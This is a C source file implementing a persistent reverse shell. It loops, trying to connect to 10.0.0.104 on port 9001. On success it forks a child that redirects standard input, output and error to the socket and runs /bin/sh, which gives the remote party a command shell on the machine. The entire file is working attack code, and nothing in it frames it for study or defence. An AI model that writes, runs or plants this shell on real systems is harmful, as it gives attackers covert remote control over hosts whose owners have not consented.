#include <stdio.h> 
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/socket.h>

#define REMOTE_ADDR "10.0.0.104"

//#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 9001

int main(int argc, char *argv[])
{

	pid_t pid; //process ID


	while(true)
	{
		//create a new socket every time
		struct sockaddr_in sa;
		int s;

		sa.sin_family = AF_INET;
		sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
		sa.sin_port = htons(REMOTE_PORT);
		s = socket(AF_INET, SOCK_STREAM,0);
		
		//attempt to connect
		if ((connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0)) //connection fails
		{
			//printf("Connect fail\n");
			close(s);
			continue;
		}




		else //connecitons succeeds
		{
			//connect(s, (struct sockaddr *)&sa, sizeof(sa));
			if ((pid = fork()) == 0) //Child Process
			{
				dup2(s,0);
				dup2(s,1);
				dup2(s,2);

				execve("/bin/sh", 0, 0);
				close(s);
				exit(0);
			}

			else //Parent Process
			{                               

			waitpid(-1, NULL, WNOHANG);
			close(s);
			continue;
	     	}

		//waitpid(-1, NULL, WNOHANG);
	}




//return 0;
}


return 0;
}
